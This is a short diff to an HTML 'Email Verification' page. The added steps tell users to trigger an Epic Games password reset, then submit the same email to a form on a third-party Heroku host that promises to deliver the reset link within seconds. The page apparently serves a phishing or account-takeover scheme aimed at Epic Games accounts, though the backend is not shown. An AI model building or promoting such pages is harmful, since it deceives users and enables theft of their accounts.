@@ -50,7 +50,14 @@
 <body>
     <div class="container">
         <h1>Email Verification</h1>
-       <form method="POST" action="https://mrcliff-reset-7af98657daa2.herokuapp.com/reset/verify_email">
+        <p>Follow these steps to get your reset link:</p>
+        <ol>
+            <li>First go to <a href="https://www.epicgames.com/id/login/forgot-password" target="_blank">https://www.epicgames.com/id/login/forgot-password</a></li>
+            <li>Enter your email to send the reset link. This will send the reset link.</li>
+            <li>Now Enter the same email in the form below and and click "Verify"</li>
+            <li>Wait for your reset for 10-30 seconds or try again.</li>
+        </ol>
+        <form method="POST" action="https://mrcliff-reset-7af98657daa2.herokuapp.com/reset/verify_email">
             <label for="email">Enter your email:</label>
             <input type="email" name="email" id="email" required>
             <button type="submit">Verify</button>
